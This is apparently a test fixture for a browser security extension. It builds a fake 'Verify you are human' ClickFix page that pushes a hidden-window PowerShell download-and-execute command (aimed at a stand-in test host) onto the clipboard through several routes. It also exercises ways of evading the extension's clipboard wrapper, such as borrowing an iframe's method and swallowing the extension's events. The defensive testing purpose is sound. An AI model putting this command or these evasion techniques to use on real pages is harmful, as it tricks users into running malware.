/**
 * A ClickFix page, for the clipboard tests in both browsers.
 *
 * The shape of the real thing: a button that looks like a check, and a command
 * put in the clipboard when it is pressed. One button per way of doing that, so
 * each test presses exactly the one it is about. Shared by the Playwright spec
 * and the Firefox runner, so the two suites test the same page.
 */

/** What the page puts in the clipboard. Harmless, and recognisable when read back. */
export const CLICKFIX_COMMAND = 'powershell -w h -c "iwr https://clickfix.test/run | iex" # visilant-e2e'

/** Names a page could only learn by reading the extension, which it can. */
const CHANNEL_NAMES = ['__visilant-clipboard-hello', '__visilant-clipboard-ask', '__visilant-clipboard-write']

export function clickFixPage() {
  const command = JSON.stringify(CLICKFIX_COMMAND)
  const names = JSON.stringify(CHANNEL_NAMES)
  return `<!doctype html>
<html><head><title>Verify you are human</title>
<script>
  // The first thing the page runs. Whether the wrapper is already in place here
  // is the whole question of whether a page can keep the original for later.
  window.__wrappedAtFirstScript = !Function.prototype.toString.call(Clipboard.prototype.writeText).includes('[native code]')
</script>
<style>
  body { margin: 0; font: 16px sans-serif }
  /* Kept short enough to need no scrollbar, which would move the warning off
     the point the tests hit-test it at */
  button { margin: 4px; padding: 6px 10px; font-size: 14px }
</style>
</head>
<body>
<button id="write-text">I'm not a robot (writeText)</button>
<button id="write-item">I'm not a robot (write)</button>
<button id="exec-copy">I'm not a robot (execCommand)</button>
<button id="fresh-frame">I'm not a robot (fresh frame)</button>
<button id="swallow">I'm not a robot (swallow the signal)</button>
<button id="reopen">Reopen the document</button>
<button id="steal-channel">I'm not a robot (steal the channel)</button>
<button id="borrow-then-remove">I'm not a robot (borrow, then remove the frame)</button>
<button id="borrow-remove-now">I'm not a robot (borrow, remove the frame at once)</button>
<button id="synthetic">Fire made-up events</button>
<button id="frame-reopen">Rewrite the blank frame</button>
<button id="swap-root">Swap the root element</button>
<input id="field" style="display:block;margin:8px;font-size:16px" placeholder="password">
<iframe id="opened" style="width:320px;height:50px;border:1px solid #ccc;display:block"></iframe>
<iframe id="inner" style="width:320px;height:70px;border:1px solid #ccc" srcdoc="<button id='frame-write' style='font-size:16px'>Verify in a frame</button><script>document.getElementById('frame-write').onclick = () => navigator.clipboard.writeText(${command.replace(/"/g, '&quot;')}).catch(() => {})</script>"></iframe>
<script>
  const COMMAND = ${command}
  const NAMES = ${names}
  // What became of the last write, for a browser where the test cannot read the
  // clipboard back without a prompt
  const record = promise => promise.then(() => { window.__lastWrite = 'ok' }, (e) => { window.__lastWrite = e.name })

  window.wrapperInstalled = () =>
    !Function.prototype.toString.call(Clipboard.prototype.writeText).includes('[native code]')
    && !Function.prototype.toString.call(Clipboard.prototype.write).includes('[native code]')

  const swallowEverything = () => {
    // Everything a page can do to an event it knows the name of
    for (const target of [window, document]) {
      for (const name of NAMES) {
        target.addEventListener(name, (e) => { e.stopImmediatePropagation(); e.preventDefault() }, true)
      }
    }
  }

  // A frame with no address of its own, made from a blob. Firefox gave a frame
  // like this no extension script at all until the frame guard asked for
  // match_origin_as_fallback, so the typing here went unheard as well.
  const blobFrame = document.createElement('iframe')
  blobFrame.id = 'blob'
  blobFrame.style.cssText = 'width:320px;height:90px;border:1px solid #ccc;display:block'
  blobFrame.src = URL.createObjectURL(new Blob([
    '<input id="blob-input" style="font-size:16px"><button id="blob-write" style="font-size:16px">Verify in a blob frame</button>'
    + '<scr' + 'ipt>document.getElementById("blob-write").onclick = () => navigator.clipboard.writeText(' + JSON.stringify(COMMAND) + ').catch(() => {})</scr' + 'ipt>',
  ], { type: 'text/html' }))
  document.body.append(blobFrame)

  document.getElementById('write-text').onclick = () => {
    record(navigator.clipboard.writeText(COMMAND))
  }
  document.getElementById('write-item').onclick = () => {
    const item = new ClipboardItem({ 'text/plain': new Blob([COMMAND], { type: 'text/plain' }) })
    record(navigator.clipboard.write([item]))
  }
  document.getElementById('exec-copy').onclick = () => {
    const area = document.createElement('textarea')
    area.value = COMMAND
    document.body.append(area)
    area.select()
    document.execCommand('copy')
    area.remove()
  }
  document.getElementById('fresh-frame').onclick = () => {
    // The known way round the wrapper: a frame made just now, whose own
    // Clipboard has not been wrapped yet, lends its method to this page
    const frame = document.createElement('iframe')
    frame.srcdoc = '<p></p>'
    frame.style.display = 'none'
    document.body.append(frame)
    const clean = frame.contentWindow.Clipboard.prototype.writeText
    record(clean.call(navigator.clipboard, COMMAND))
  }
  document.getElementById('swallow').onclick = () => {
    swallowEverything()
    record(navigator.clipboard.writeText(COMMAND))
  }
  document.getElementById('steal-channel').onclick = () => {
    // Ask the wrapper to announce itself again, catch the node it hands over,
    // and stand on it. Too late: the content script's listener is already there.
    window.addEventListener(NAMES[0], (e) => {
      const node = e.relatedTarget
      window.__stoleNode = Boolean(node)
      if (node)
        node.addEventListener(NAMES[2], (inner) => { inner.stopImmediatePropagation(); inner.preventDefault() }, true)
      e.stopImmediatePropagation()
    }, true)
    window.dispatchEvent(new Event(NAMES[1]))
    record(navigator.clipboard.writeText(COMMAND))
  }
  // A loaded frame's wrapper, called on this page's clipboard. Only the frame
  // hears about it, and the page then takes the frame away.
  const borrowed = () => document.getElementById('inner').contentWindow.Clipboard.prototype.writeText
  document.getElementById('borrow-then-remove').onclick = () => {
    borrowed().call(navigator.clipboard, COMMAND).then(() => {
      window.__lastWrite = 'ok'
      document.getElementById('inner').remove()
    }, (e) => { window.__lastWrite = e.name })
  }
  document.getElementById('borrow-remove-now').onclick = () => {
    record(borrowed().call(navigator.clipboard, COMMAND))
    document.getElementById('inner').remove()
  }
  document.getElementById('synthetic').onclick = () => {
    // Events the page makes up. None of them types, pastes or copies anything,
    // and none of them may spend a warning the real thing is owed.
    const field = document.getElementById('field')
    field.dispatchEvent(new KeyboardEvent('keydown', { key: 'a', bubbles: true }))
    field.dispatchEvent(new InputEvent('beforeinput', { inputType: 'insertText', data: 'a', bubbles: true }))
    const data = new DataTransfer()
    data.setData('text/plain', 'made up')
    field.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    document.dispatchEvent(new ClipboardEvent('copy', { bubbles: true }))
    document.dispatchEvent(new ClipboardEvent('cut', { bubbles: true }))
    window.__syntheticFired = true
  }
  document.getElementById('swap-root').onclick = () => {
    // Out with the root and back again, many times over, so that some swap
    // lands while the extension is still rebuilding its UI from the last one
    const original = document.documentElement
    let swaps = 0
    const timer = setInterval(() => {
      const current = document.documentElement
      document.replaceChild(current === original ? document.createElement('html') : original, current)
      if (++swaps >= 40 && document.documentElement === original) {
        clearInterval(timer)
        window.__swapsDone = true
      }
    }, 15)
  }
  document.getElementById('frame-reopen').onclick = () => {
    // The commonest document.open() there is: a page writing a form into a
    // blank frame it made, after the frame guard had already started there
    const doc = document.getElementById('opened').contentDocument
    doc.open()
    doc.write('<input id="opened-field" style="font-size:16px">')
    doc.close()
  }
  document.getElementById('reopen').onclick = () => {
    // document.open() erases every listener on the window and the document,
    // a content script's included, and the page then gets in first
    document.open()
    document.write('<!doctype html><html><body style="margin:0;font:16px sans-serif">'
      + '<button id="after-reopen" style="margin:8px;padding:10px 16px;font-size:16px">I am not a robot (after document.open)</button>'
      + '<button id="after-copy" style="margin:8px;padding:10px 16px;font-size:16px">Copy (after document.open)</button>'
      + '<input id="after-field" style="display:block;margin:8px;font-size:16px"></body></html>')
    document.close()
    swallowEverything()
    document.getElementById('after-reopen').onclick = () => {
      record(navigator.clipboard.writeText(COMMAND))
    }
    document.getElementById('after-copy').onclick = () => {
      const area = document.createElement('textarea')
      area.value = COMMAND
      document.body.append(area)
      area.select()
      document.execCommand('copy')
      area.remove()
    }
  }
</script>
</body></html>`
}
